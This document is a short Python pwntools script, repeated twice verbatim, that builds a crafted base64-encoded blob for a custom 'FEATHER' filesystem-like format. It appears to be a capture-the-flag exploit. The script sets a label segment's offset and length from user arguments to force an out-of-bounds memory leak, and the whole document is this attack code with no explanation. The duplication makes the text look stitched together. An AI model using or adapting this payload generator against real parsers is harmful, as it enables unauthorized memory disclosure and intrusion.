from pwn import *
import base64, struct, sys

def mk_blob(leak_off, leak_len, pad=0x30000):
    # 1 label segment, 1 root dir segment no children
    hdr = struct.pack('<QI', 0x52454854414546, 2)
    segs = []
    data = b''
    # label
    segs.append(struct.pack('<IIII', 5, 1, leak_off, leak_len))
    # root dir at actual data start after payload pad
    root = struct.pack('<II', 0, 0)
    root_off = pad
    segs.append(struct.pack('<IIII', 0, 2, root_off, len(root)))
    blob = hdr + b''.join(segs)
    # pad data region to desired actual root offset
    blob += b'A'*pad + root
    return base64.b64encode(blob)+b'\n\n'

if __name__=='__main__':
    off = int(sys.argv[1],0)
    ln = int(sys.argv[2],0)
    sys.stdout.buffer.write(mk_blob(off,ln))

from pwn import *
import base64, struct, sys

def mk_blob(leak_off, leak_len, pad=0x30000):
    # 1 label segment, 1 root dir segment no children
    hdr = struct.pack('<QI', 0x52454854414546, 2)
    segs = []
    data = b''
    # label
    segs.append(struct.pack('<IIII', 5, 1, leak_off, leak_len))
    # root dir at actual data start after payload pad
    root = struct.pack('<II', 0, 0)
    root_off = pad
    segs.append(struct.pack('<IIII', 0, 2, root_off, len(root)))
    blob = hdr + b''.join(segs)
    # pad data region to desired actual root offset
    blob += b'A'*pad + root
    return base64.b64encode(blob)+b'\n\n'

if __name__=='__main__':
    off = int(sys.argv[1],0)
    ln = int(sys.argv[2],0)
    sys.stdout.buffer.write(mk_blob(off,ln))
